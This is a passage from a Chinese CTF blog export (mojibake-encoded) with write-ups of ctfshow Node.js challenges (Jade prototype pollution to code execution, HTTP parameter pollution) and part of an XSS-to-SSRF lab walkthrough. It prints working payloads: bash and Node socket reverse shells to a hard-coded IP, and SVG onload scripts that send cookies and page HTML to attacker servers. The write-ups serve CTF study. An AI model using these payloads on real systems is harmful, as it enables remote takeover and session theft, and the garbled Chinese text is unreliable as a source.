çœ‹çœ‹è¿”å›å€¼ä¸­æ˜¯å¦æœ‰å¯æ§éƒ¨åˆ† parse æ–¹æ³•å†…éƒ¨å¯ä»¥çœ‹åˆ°å…ˆå†…éƒ¨ parse å†å†…éƒ¨ compileï¼Œå†…éƒ¨ parse ç»“æœæœ€ç»ˆä¼šè¢«æ‹¼æ¥åˆ°å¤–å±‚ parse å‡½æ•°è¿”å›å€¼éƒ¨åˆ† å³ 114è¡Œçš„ jså¯¹è±¡ è¢«æ‹¼æ¥åˆ° 148è¡Œ æˆ– 149è¡Œçš„ jså¯¹è±¡ é‡Œï¼Œæœ€ç»ˆæ‹¼æ¥åˆ° bodyé”® è¿”å› å…ˆè·Ÿè¿› 114è¡Œ çš„ compile æ–¹æ³•ï¼Œå‘ç°æœ¬æ–¹æ³•è¿”å›çš„æ˜¯ buf è·Ÿè¿› 66è¡Œçš„ this.visit(this.node); å‘ç°å¯æ§ï¼ˆå› ä¸º node.filename è¢« utils.stringify() äº†ï¼‰çš„ node.line å¯ä»¥è¢« push åˆ° buf ä¸­ï¼Œæ¡ä»¶æ˜¯ this.debug=true ç„¶ååœ¨ 212è¡Œçš„ this.visitNode(node); å»éå† ast æ ‘ï¼Œéå†å®Œåå›åˆ° compile æ–¹æ³• å¯ä»¥çœ‹åˆ° node.line è¢«è®°å½•åˆ° fn ä¸­ï¼Œç„¶åé€šè¿‡ Function è°ƒç”¨æ‰§è¡Œè¿™éƒ¨åˆ†ä»£ç ã€‚ ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬å¯ä»¥æ±¡æŸ“ node.line å°±å¯ä»¥è¿è¡Œæˆ‘ä»¬ä»£ç ã€‚ ä¹Ÿå°±æ˜¯è¯´ jade æœ¬èº«æ˜¯æ²¡æœ‰æ¼æ´çš„ï¼Œå› ä¸ºæ¨¡æ¿çš„æ¸²æŸ“é€»è¾‘æ˜¯å¦‚ä½•ï¼Œä½†é—®é¢˜æ˜¯ï¼Œå¦‚æœå­˜åœ¨å¯æ§çš„åŸå‹é“¾æ±¡æŸ“ï¼Œå°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ±¡æŸ“ node.line ã€‚ äºæ˜¯å°è¯• POST /login æ¥å£ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;&#125;&#125;&#125; æ–­ç‚¹å‘ç°ï¼Œï¼Œ node.line å€¼è¿˜æ˜¯ 0ã€1ã€2 ä¹‹ç±»çš„ï¼Ÿ çªç„¶é†’æ‚Ÿï¼Œï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°ï¼Œnode.line æ˜¯å­˜åœ¨å€¼çš„ï¼Œæ¯”å¦‚ä¸Šå›¾ä¸­çš„ 0ã€1ã€2 ï¼Œå¦‚æœå­˜åœ¨å€¼çš„è¯ï¼Œå®ƒä¼šç›´æ¥è·å–è¿™ä¸ªå€¼ï¼Œè€Œä¸æ˜¯è·å–æˆ‘ä»¬æ±¡æŸ“è¿‡çš„ Object å¯¹è±¡é‡Œçš„å€¼ï¼ å…¶å®åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨æ ¸å¿ƒå°±æ˜¯ï¼šè®¿é—®å¯¹è±¡çš„å±æ€§/å€¼ä¸º undefined æ‰è¡Œï¼Œä¸ç„¶æˆ‘ä»¬æ±¡æŸ“ Object å¯¹è±¡å°±æ²¡æœ‰æ„ä¹‰äº†ã€‚ ç°åœ¨çœ‹è¿™ç¯‡æ–‡ç« å°±èƒ½çœ‹æ‡‚äº†ï¼Œè€Œä¸”å‘ç°æ€»ç»“çš„éå¸¸å¥½ã€‚ã€‚ https://xz.aliyun.com/t/7025 å¥½çš„ï¼Œåœ¨åŒä¸€é¢‘é“ä¸Šäº†ã€‚ å…ˆæ¢³ç†ä¸Šé¢åˆ†æçš„å‡½æ•°è°ƒç”¨æ ˆï¼Œæˆ‘ä»¬æ–­ç‚¹å…¥å£åœ¨ routes/index.js res.render(&#39;index&#39;,&#123;title:&#39;ctfshow&#39;&#125;); ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ routes/index.js :: res.render jade/lib/index.js :: exports.__express jade/lib/index.js :: exports.renderFile jade/lib/index.js :: handleTemplateCache jade/lib/index.js :: exports.compile jade/lib/index.js :: parse -&gt; compiler.compile(); jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node) jade/lib/compiler.js :: this.visit jade/lib/compiler.js :: this.buf.push jade/lib/index.js :: parse -&gt; options.self jade/lib/index.js :: fn = new Function(â€˜locals, jadeâ€™, fn) jade/lib/index.js :: fn(locals, Object.create(runtime)) è‡³ 4. a. iii. è¿™éƒ¨åˆ†è°ƒç”¨æ ˆç”¨ä¸‹å›¾ï¼Œ4. b. c. d. çš„åœ¨ä¸Šé¢ debug ä¹Ÿæœ‰æåŠï¼Œå› æ­¤è°ƒç”¨æ ˆè¿™éƒ¨åˆ†é—®é¢˜ä¸å¤§ é—®é¢˜æœ‰ 3 visit æ–¹æ³•ä¸­ this.debug=true ï¼Œä¸ç„¶ this.buf.push è°ƒç”¨ä¸äº† åœ¨ä¸Šé¢æåˆ°çš„ï¼šnode.line åœ¨æŸå¤„ä¸º undefined æ‰è¡Œï¼Œä¸ç„¶æˆ‘ä»¬æ±¡æŸ“çš„ Object å¯¹è±¡å°±æ²¡æ„ä¹‰ ä¿è¯èƒ½å¤Ÿæ‰§è¡Œåˆ°æ¸²æŸ“é˜¶æ®µï¼Œå› ä¸ºè¦†ç›–æŸäº›å±æ€§ä¼šå¯¼è‡´è«åå…¶å¦™çš„å¼‚å¸¸ ç¬¬ 1 ä¸ªé—®é¢˜å®¹æ˜“è§£å†³ï¼Œå› ä¸ºåœ¨ Jade å…¥å£ exports.__express ï¼Œæˆ‘ä»¬ä¸Šé¢ deubg åˆ†ææ—¶ä¹Ÿçœ‹åˆ° 123456exports.__express = function (path, options, fn) &#123; if (options.compileDebug == undefined &amp;&amp; process.env.NODE_ENV === &#x27;production&#x27;) &#123; options.compileDebug = false; &#125; exports.renderFile(path, options, fn);&#125; options.compileDebug æ— åˆå§‹å€¼ï¼Œå¯ä»¥è¦†ç›–å¼€å¯ Debug æ¨¡å¼ï¼ˆç»åˆ†æï¼Œthis.debug è·å–çš„å°±æ˜¯è¿™é‡Œçš„ debug å€¼ï¼‰ï¼Œå½“ç„¶ä¹Ÿæœ‰å¦å¤–ä¸€ç§æƒ…å†µï¼Œéƒ¨ç½²æ—¶ï¼Œæ²¡æœ‰æ­£ç¡®é…ç½® req.app.get(&#39;env&#39;) å¯¼è‡´ debug æ¨¡å¼å¼€å¯ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡ä¹Ÿå¯ä»¥ä¸ç”¨è¦†ç›–ï¼Œä½†ä¸ºäº†ç¡®ä¿é€šç”¨æ€§ï¼Œè¿™é‡Œè¿˜æ˜¯è¦†ç›–ä¸€ä¸‹ï¼Œé˜²æ­¢æ­£ç¡®é…ç½®ï¼Œ2333ã€‚ è¿™é‡Œå›  utils.copy(user.userinfo,req.body); ä¸ web341ä¸€æ ·ï¼Œuserinfo.__proto__.__proto__ æ‰æ˜¯ Object å¯¹è±¡çš„åŸå‹ï¼Œæ‰€ä»¥è¦å¥—ä¸¤å±‚ã€‚ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1&#125;&#125;&#125; å…ˆæ‰“ä¸€ä¸‹ ç¬¬ 3 ä¸ªé—®é¢˜æå‰å‡ºç°äº†ï¼Œè¦å…ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¿è¯ä»£ç èƒ½å¤Ÿæ‰§è¡Œåˆ°æ¸²æŸ“é˜¶æ®µ å’Œå…ˆçŸ¥æ–‡ç« é‡Œä¸åŒï¼Œè¿™é‡ŒæŠ¥é”™æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå…ˆè·Ÿè¿› Compiler.visitNode 225è¡Œçœ‹ä¸€ä¸‹ æ‹¼æ¥ä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰è¿™ä¸ªæ–¹æ³• åœ¨éå†ASTæ ‘æ—¶ï¼Œé€šå¸¸æ˜¯é€šè¿‡ &quot;visit&quot; + èŠ‚ç‚¹ç±»å‹ æ¥éå†æ‰€æœ‰èŠ‚ç‚¹çš„ï¼Œè§‚å¯Ÿé”™è¯¯è°ƒç”¨æ ˆä¹ŸçŸ¥ï¼Œæ¯”å¦‚ visitBlockï¼Œå°±æ˜¯è®¿é—® Block èŠ‚ç‚¹ã€‚é‚£ Block å¯ç”¨ï¼Œæˆ‘ä»¬å°±æ±¡æŸ“ä¸€ä¸‹ type å°±å¥½äº†ï¼Œå½“å®ƒå½“å‰ä¸Šä¸‹æ–‡æ‰¾ä¸åˆ°å°±å»æ‰¾ Object äº†ã€‚ å½“ç„¶é€‰å–æ—¶ï¼Œæœ€å¥½æ˜¯é€‰çš„èŠ‚ç‚¹é™„å¸¦çš„ä¸Šä¸‹æ–‡ä¿¡æ¯è¿›å…¥åï¼Œå•¥äº‹ä¹Ÿä¸ä¼šåšçš„ï¼Œä¸ç„¶ä¹Ÿæœ‰èµ°å‘å¥‡å¥‡æ€ªæ€ªçš„é€»è¾‘ï¼Œå…ˆæ¥çœ‹çœ‹ Block èŠ‚ç‚¹ã€‚ è¿™é‡ŒåŠ ä¸Šè¿™éƒ¨åˆ†é€»è¾‘ï¼Œæ¥çœ‹çœ‹æˆ‘ä»¬æ•…æ„ä¼ªé€  Block èŠ‚ç‚¹ä¼šå‘ç”Ÿä»€ä¹ˆ 123if (node.type == undefined) &#123; return this[&#x27;visit&#x27; + &#x27;Block&#x27;](node);&#125; è¿™é‡Œ block.nodes ä¸º undefined ï¼Œç„¶å undefined.length æ˜æ˜¾ï¼Œè¿™æ ·è®¿é—®ä¼šæŠ¥é”™ï¼Œå¯¼è‡´è¿›å…¥å…¶ä»–é”™è¯¯ï¼Œç„¶å jade æ²¡æœ‰å¯¹è¿™å—å¼‚å¸¸è¿›è¡Œå¤„ç†ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœ vist çš„èŠ‚ç‚¹ä¸æ˜¯è¿™ç§ block.å­å±æ€§.å­™å­å±æ€§ é—®é¢˜åº”è¯¥ä¸å¤§ã€‚é¡¶å¤šä¸€ä¸ª undefined ç„¶åç›´æ¥ç»“æŸå•¥çš„ï¼Œè¿™é‡Œè¯•è¯• visitCode ï¼Œ æ­£å¸¸èµ°åˆ°åé¢ï¼Œæ²¡æœ‰æŠ¥é”™ï¼ŒæœŸé—´åªè§¦å‘äº† this.buf.push(code.val) ï¼Œé—®é¢˜åº”è¯¥ä¸å¤§ã€‚ å°è¯•æ±¡æŸ“ type ä¸º Code 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;&#125;&#125;&#125; å¥½è€¶ï¼Œåƒæ˜¯è§£å†³äº†ï¼Œå› ä¸ºè¿™ä¸ªæŠ¥é”™å’Œå…ˆçŸ¥æ–‡ç« æŠ¥é”™ä¸€è‡´ã€‚ å°è¯•è§£å†³è¿™ä¸ªæŠ¥é”™ï¼Œå› ä¸ºçœ‹é”™è¯¯è°ƒè¿™é‡Œå¥½åƒè¿˜æ²¡åˆ°æ¸²æŸ“æˆåŠŸçš„åœ°æ–¹ã€‚ åˆ†æè¿™ä¸ªé”™è¯¯æ ˆï¼Œå¯ä»¥çœ‹åˆ°å‰ 4 ç‚¹è¿˜æ˜¯å±äº jade èŒƒç•´ã€‚å…ˆè·Ÿè¿› jade æ¨¡å—æœ€åæŠ¥é”™çš„åœ°æ–¹ï¼Œå³ jade/libindex.js 149è¡Œçš„ parse æ–¹æ³•ï¼Œ å‘ç°ï¼Œç¨‹åºå·²ç»èµ°å®ŒåˆšåˆšASTéå†éƒ¨åˆ†äº†ï¼Œå·²ç»å·®ä¸å¤šè¦è¿”å›äº†ã€‚ æ„Ÿè§‰åªè¦é¿å…è¿›å…¥149è¡Œçš„ addWith æ–¹æ³•ï¼Œå°±å¯ä»¥æ¸²æŸ“æˆåŠŸäº†ï¼ ç„¶åè¿›å…¥149è¡Œçš„ addWith æ–¹æ³•æ˜¯æ»¡è¶³147è¡Œçš„ options.self å€¼ä¸º Falseï¼Œå°è¯•ä¸‹çœ‹çœ‹è¿™ä¸ª options.self é»˜è®¤æ˜¯ä¸æ˜¯ undefinedï¼Œå¦‚æœæ˜¯å°±å¯ä»¥æ±¡æŸ“äº†ã€‚ niceï¼Œå°±æ˜¯ undefined ï¼Œå°è¯•æ±¡æŸ“ self ä¸º true ï¼Œ1 ä¹Ÿå¯ä»¥ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1&#125;&#125;&#125; ï¼ï¼ï¼ç»ˆäºèµ°åˆ°æ¸²æŸ“è¿™ä¸€æ­¥äº†ï¼ çœ‹åˆ° undefined å¥½è¯´ï¼Œæ±¡æŸ“å°±å®Œäº‹äº† ï¼ˆ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;title&quot;:&quot;tari&quot;&#125;&#125;&#125; åˆ°è¿™ index çš„é¡µé¢æ¸²æŸ“å°±æ²¡å•¥é—®é¢˜äº†ï¼Œåˆ° ç¬¬ 2 ä¸ªé—®é¢˜ï¼Œnode.line åœ¨æŸå¤„ä¸º undefined æ‰è¡Œï¼Œä¸ç„¶æˆ‘ä»¬æ±¡æŸ“çš„ Object å¯¹è±¡å°±æ²¡æ„ä¹‰ è¿™é‡Œå¦‚æœä¸€æ­¥ä¸€æ­¥åŠ¨æ€è°ƒè¯•ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥æ³¨å…¥æµ‹è¯•å³å¯ å‘ç°éƒ½ node ä¸º Block çš„æ—¶å€™ line æ˜¯ä¸å­˜åœ¨çš„ã€‚ ç†è®ºä¸Šï¼Œåªè¦è¦†ç›–äº† node.line å³å¯è¾¾åˆ°ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚ ç„¶åæ‹¼æ¥ä¸Šé¢é¿å…æŠ¥é”™çš„å‚æ•°ï¼Œå¾—åˆ° 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;title&quot;:&quot;tari&quot;,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/2233&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125; åå¼¹ Shell å† POSTä¸€æ¬¡ï¼Œå‘é€çš„æ•°æ®åŒ…ä¸ç”¨å˜ ä¸å°±å°‘äº†ä¸ª messageï¼Œé‚£æˆ‘æ±¡æŸ“ä½ å‘—ï¼Œï¼Œç„¶å message ååˆè¯´å°‘äº† error ç»§ç»­æ±¡æŸ“ï¼Œç„¶å error æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå°±éœ€è¦å¼„ä¸ª json æ ¼å¼æ•°æ®å•¦ã€‚ emmmï¼Œåˆ°è¿™ï¼Œå…¶å®ä¸€å¼€å§‹å°±çŠ¯äº†ä¸ªå¾ˆè ¢çš„é”™ã€‚ã€‚ã€‚å…¶å®ä¸€å¼€å§‹å°±åº”è¯¥æ±¡æŸ“ line å…ˆçš„ï¼Œç„¶ååœ¨è¯• compileDebugã€typeã€selfï¼Œè ¢å“­äº†ï¼Œï¼Œå› ä¸ºï¼Œå¦‚æœä¸æ±¡æŸ“ line å…ˆçš„è¯ï¼Œä¸èƒ½ä¿è¯åœ¨ line æ­£ç¡®çš„æƒ…å†µä¸‹è¯•å…¶ä»–çš„ï¼Œå°±ä¼šå¯¼è‡´ï¼Œï¼Œå…¶ä»–å¯¹äº†ï¼ŒåŠ ä¸Š line å°±é”™äº†ã€‚ã€‚ å…¶å®è¿™é‡Œï¼Œå‹æ ¹å°±ä¸ç”¨æ±¡æŸ“ titleï¼Œå¦‚æœæ˜¯ å…ˆæ±¡æŸ“ lineï¼Œç„¶ååˆ° compileDebugã€typeã€self ä¼šå‘ç°ï¼Œåˆ° self è¿™å°±å¯ä»¥æˆåŠŸåå¼¹ shell äº†ï¼Œäººéƒ½å‚»äº†ã€‚ã€‚ã€‚ æœ€ç»ˆ EXP 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/119.28.15.55/2233 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125; ä¸ç”¨å˜ï¼Œåœ¨POSTä¸€æ¬¡å³å¯ åŸæœ¬æƒ³ç”¨åŸç”ŸSocketçš„ï¼Œä¸çŸ¥é“ä¸ºå•¥è€æ˜¯æŠ¥é”™ï¼Œå¥‡æ€ªï¼Œï¼Œéš¾é“é—­åˆä¸äº†ï¼Ÿ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;æœåŠ¡å™¨IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#125; web343 åŸå‹é“¾æ±¡æŸ“ +++++è¯´æœ‰è¿‡æ»¤ï¼Œä½† web342ä¸€æ ·çš„ EXP ä¹Ÿå¯ä»¥æ‰“ï¼Œåå¼¹shellåçœ‹æºç æ‰å‘ç°ç¡®å®å¤šäº†ç‚¹ä¸œè¥¿ login.js 1234567891011121314151617181920212223242526272829303132var express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page. */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123; res.type(&#x27;html&#x27;); var user = new function()&#123; this.userinfo = new function()&#123; this.isVIP = false; this.isAdmin = false; this.isAuthor = false; &#125;; &#125;; if(JSON.stringify(req.body).match(/Text/ig))&#123; res.end(&#x27;hacker go away&#x27;); &#125;else&#123; utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin)&#123; return res.json(&#123;ret_code: 0, ret_msg: &#x27;ç™»å½•æˆåŠŸ&#x27;&#125;); &#125;else&#123; return res.json(&#123;ret_code: 2, ret_msg: &#x27;ç™»å½•å¤±è´¥&#x27;&#125;); &#125; &#125;&#125;);module.exports = router; emmm æœ‰ç‚¹ä¸æ‡‚è¿™ä¸ª JSON.stringify(req.body).match(/Text/ig) è¿‡æ»¤æœ‰å•¥æ„ä¹‰å°±æ˜¯äº†ã€‚ã€‚ å’Œweb342ä¸€æ ·çš„EXP web344 HPPä»£ç  1234567891011121314router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag = &#x27;flag_here&#x27;; if(req.url.match(/8c|2c|\\,/ig))&#123; res.end(&#x27;where is flag :)&#x27;); &#125; var query = JSON.parse(req.query.query); if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===true)&#123; res.end(flag); &#125;else&#123; res.end(&#x27;where is flag. :)&#x27;); &#125;&#125;); å³ url ä¸­ä¸èƒ½åŒ…å«å¤§å°å†™ 8cã€2c å’Œ é€—å· å…ˆæ„é€ ä¸€ä¸ªæ­£å¸¸è¯·æ±‚ 1/?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125; å‘ç°é¢˜ç›®ä¼šè¿‡æ»¤æ‰é€—å·ï¼Œå°è¯• URL ç¼–ç ï¼Œ urlencode(&quot;,&quot;) = %2c å‘ç° 2c ä¹Ÿè¢«è¿‡æ»¤ HTTPåè®®ä¸­å…è®¸åŒåå‚æ•°å‡ºç°å¤šæ¬¡ï¼Œä¸åŒæœåŠ¡ç«¯å¯¹åŒåå‚æ•°å¤„ç†éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸‹é¢é“¾æ¥åˆ—ä¸¾äº†ä¸€äº› https://www.cnblogs.com/AtesetEnginner/p/12375499.html nodejs ä¼šæŠŠåŒåå‚æ•°ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨ï¼Œå¹¶ä¸” JSON.parse å¯ä»¥æ­£å¸¸è§£æã€‚ å› æ­¤æ„é€  1/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125; è¿™é‡ŒæŠŠ cè¿›è¡Œurlç¼–ç ï¼Œæ˜¯å› ä¸º åŒå¼•å· çš„urlç¼–ç æ˜¯ %22ï¼Œå’Œ c è¿æ¥èµ·æ¥å°±æ˜¯ %22cï¼Œä¼šåŒ¹é…åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚ ä¸€äº›å‚è€ƒçš„é¢˜è§£ https://blog.csdn.net/solitudi/article/details/111669500 https://blog.csdn.net/miuzzx/article/details/111780832 http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctfç»ƒä¹ ","slug":"ctf/ctfshow/ctfç»ƒä¹ ","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctfç»ƒä¹ ","slug":"ctfç»ƒä¹ ","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"}]},{"title":"XSS & SSRFç»„åˆæ‹³","slug":"xssrf","date":"2021-04-26T01:58:40.000Z","updated":"2021-04-26T07:59:47.566Z","comments":true,"path":"2021/04/26/xssrf/","link":"","permalink":"https://tari.moe/2021/04/26/xssrf/","excerpt":"","text":"å»å¹´å®ä¹ ä¸­å°±é‡åˆ°ä¸€ä¸ªåœºæ™¯ï¼Œç”¨ xss å»æ‰“ redisï¼Œæƒ³ç€åˆ·åˆ·é¶åœºç»ƒä¹ ä¸€ä¸‹ï¼Œç„¶åå°±åœ¨æ”¶è—å¤¹åƒäº†ä¸€å¹´çš„ç°äº†ã€‚ã€‚ https://xssrf.hackme.inndy.tw/ å³ä¸‹é¢é“¾æ¥çš„ 38 - 40 é¢˜ https://hackme.inndy.tw/scoreboard æ‰«æä¸€ä¸‹ç›®å½•ï¼Œå‘ç° robots.txt é‡Œæœ‰ä¸‰æ¡ä¿¡æ¯ 123Disallow: /config.phpDisallow: /you/cant/read/config.php/can/you?Disallow: /backup.zip å‘ç° backup.zip æœ‰å¯†ç æ‰“ä¸å¼€ xssmeéšä¾¿ç”¨ä¸ªå¸å·æ³¨å†Œç™»å½•ä¸€ä¸‹ï¼Œåœ¨ Mailbox æ”¶åˆ°ç®¡ç†å‘˜å‘æ¥çš„é‚®ä»¶ I am admin from this website, I will read all your mails but never reply. ä¹Ÿå°±æ˜¯ä¼šä¸€ç›´è¯»æˆ‘å‘çš„é‚®ä»¶ï¼Œä½†æ˜¯ä¸ä¼šå›å¤ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å›æ˜¾ã€‚ ç›´æ¥ä¸Š payload 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233&#x27;&quot;&gt; è¿™é‡Œç”¨ svg/onload æ˜¯ä¸ºäº†ç»•è¿‡ç©ºæ ¼é™åˆ¶ å¯ä»¥æ­£å¸¸é€šä¿¡ è·å–ç®¡ç†å‘˜ Cookie 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cookie&quot;&gt; å¥‡æ€ªï¼Œæ¥æ”¶ä¸åˆ° ä½†é€šè¿‡å¯¼èˆªæ  Sent Mail å¯ä»¥è·å–è‡ªå·±çš„ã€‚ã€‚ã€‚è¯•è¯•é€šè¿‡æ¥æ”¶å¹³å°æ¥æ¥æ”¶ http://ceye.io/ 1&lt;svg/onload=&quot;document.location=&#x27;http://c6i7bf.ceye.io/&#x27;+document.cookie&quot;&gt; åªæœ‰ dns è§£æè®°å½•ï¼Œæ²¡æœ‰ http è¯·æ±‚è®°å½•ã€‚ã€‚XSSå¹³å°Cookieå­—æ®µä¸ºç©ºã€‚ã€‚ã€‚ å¥‡æ€ªäº†ï¼Œç„¶åè¯•è¯• 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cooki&quot;&gt; å‘ç°è¿”å›æ­£å¸¸ï¼Œéš¾é“ï¼Œè¿‡æ»¤äº†cookieå…³é”®å­—ï¼Ÿæˆ–è€…ï¼Œï¼ŒCookieé‡Œçš„ç‰¹æ®Šå­—æ®µå¯¼è‡´ HTTPåŒ…å¼‚å¸¸ï¼Ÿå°è¯•å¯¹è·å–åˆ°çš„ cookie è¿›è¡Œç¼–ç ã€‚ 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.cookie)&quot;&gt; ä¸ºå•¥ç”¨ btoa å‘¢ï¼Œå› ä¸ºä¸€å¼€å§‹è¯•è¿‡äº† escape ä¸è¿‡æ²¡ç”¨â€¦ escape å Cookieé‡Œä¹Ÿæ²¡ç©ºæ ¼çš„æ ·å­emmm å› ä¸ºé¢˜ç›®è¿‡æ»¤äº† ) ï¼Œæ‰€ä»¥éœ€è¦HTMLç¼–ç ä¸€ä¸‹åŒå¼•å·é‡Œé¢çš„ã€‚ https://www.qqxiuzi.cn/bianma/zifushiti.php å¥½è€¶ï¼ ç¬¬ä¸€ä¸ªflag 1FLAG&#123;Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#125; å¹¶æç¤ºäº†ç¬¬äºŒä¸ª flag åœ¨ redis é‡Œ xssrf leakå°è¯•ç”¨ xssme å¾—åˆ°çš„ admin cookie ï¼Œå°è¯• XFF ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ è¿™é‡Œå…ˆè¯»ä¸€ä¸‹ admin é¡µé¢ 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.body.innerHTML)&quot;&gt; åŒæ ·å¼•å·é‡Œçš„ä¸œè¥¿HTMLç¼–ç ä¸€ä¸‹ç»™ç®¡ç†å‘˜å‘é‚®ä»¶ æ­£å¸¸æ”¶åˆ° æŠŠè¿™ä¸€ä¸² base64è§£ç ä¸€ä¸‹ï¼Œæå–å…³é”®ä¿¡æ¯ï¼Œå‘ç°ä¸»è¦å¤šäº† Set Admin å’Œ Send Request ä¸¤ä¸ªåŠŸèƒ½ã€‚ 1234567891011121314151617&lt;ul class=&quot;navbar-nav&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt; é€šè¿‡ AJAX è¯·æ±‚åˆ†åˆ«è¯·æ±‚ä¸€ä¸‹ setadmin.php å’Œ request.php çœ‹çœ‹ 123456789101112&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; ä¸€æ ·HTMLç¼–ç ä¸€ä¸‹åŒå¼•å·é‡Œé¢çš„éƒ¨åˆ†ï¼ŒåŒæ ·åœ¨å¯¼èˆªæ  Send Mail éƒ¨åˆ†å‘é€ base64è§£ç æå–å…³é”®éƒ¨åˆ† 1234567&lt;form action=&quot;/request.php&quot; 